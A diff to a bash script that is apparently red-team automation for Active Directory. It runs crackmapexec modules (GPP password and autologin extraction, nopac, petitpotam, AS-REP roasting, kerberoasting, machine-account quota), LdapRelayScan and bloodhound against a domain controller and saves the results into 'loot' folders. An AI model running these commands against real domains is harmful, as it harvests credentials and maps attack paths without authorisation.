@@ -58,8 +58,6 @@ echo $HASH
 echo $DOM
 echo $IP
 
-#exit 0
-
 shift "$((OPTIND - 1))"
 [ "$1" = "--" ] && shift
 
@@ -83,11 +81,11 @@ if [ -z $HASH ]
 then
  # Use Password
  # GPP password
-    crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M gpp_password
-exit 0
- # GPP autologin
-    crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M gpp_autologin
+    crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M gpp_password >> /root/output/loot/intern/ad/gpp_password
 
+ # GPP autologin
+    crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M gpp_autologin >> /root/output/loot/intern/ad/gpp_autologin
+exit 0
  # User txt from DC
     crackmapexec smb $IP -u $USER -p $PASS -d $DOM --users > /root/output/list/raw.txt
     awk '/445/ {print$5}' /root/output/list/raw.txt | cut -d '\' -f 2 | sed '/\x1b\[[0-9;]*[mGKHF]/d' | grep -v 'HealthMailbox' > /root/output/list/user.txt
@@ -97,19 +95,28 @@ exit 0
  # keep the raw file for screens and debugging
 
  # Password policy
-    crackmapexec smb $IP -u $USER -p $PASS -d $DOM --pass-pol
+    crackmapexec smb $IP -u $USER -p $PASS -d $DOM --pass-pol >> /root/output/loot/intern/ad/passpol
 
  # nopac
-    crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M nopac
+    crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M nopac >> /root/output/loot/intern/ldap/nopac
 
  # petitpotam
-    crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M petitpotam
+    crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M petitpotam >> /root/output/loot/intern/rpc/petit_potam
 
  # sessions
-    crackmapexec smb $IP -u $USER -p $PASS -d $DOM --sessions
+    crackmapexec smb $IP -u $USER -p $PASS -d $DOM --sessions >> /root/output/loot/intern/ad/session
+
+ # asreproast
+    crackmapexec ldap $IP -u $USER -p $PASS -d $DOM --asreproas /root/output/loot/intern/sd/kerberos/asreproast/asrep.txt
+
+ # kerberoast
+   crackmapexec ldap $IP -u $USER -p $PASS -d $DOM --kerberoasting /root/output/loot/intern/sd/kerberos/kerberoasting/krb.txt
+
+ # MAQ  
+   crackmapexec ldap $IP -u $USER -p $PASS -d $DOM -M MAQ >> /root/output/loot/intern/ad/quota/maq.txt
 
  # ldap signing 
-    python3 /opt/LdapRelayScan/LdapRelayScan.py -u $USER -p $PASS -dc-ip $IP -method BOTH > /root/output/loot/intern/ldap/signing/signig.txt
+    python3 /opt/LdapRelayScan/LdapRelayScan.py -u $USER -p $PASS -dc-ip $IP -method BOTH >> /root/output/loot/intern/ldap/signing/signig.txt
 
  # bloodhound
     bloodhound-python -u $USER -p $PASS -d $DOM -dc $FQDN -w 50 -c all --zip
@@ -119,6 +126,7 @@ fi
 
 if [ -z $PASS ]
 then
+exit 0
  # use HASH
  # GPP password
     crackmapexec smb $IP -u $USER -H $HASH -d $DOM -M gpp_password | tee -a /root/output/loot/intern/ad/gpp_password/$IP_pass.txt
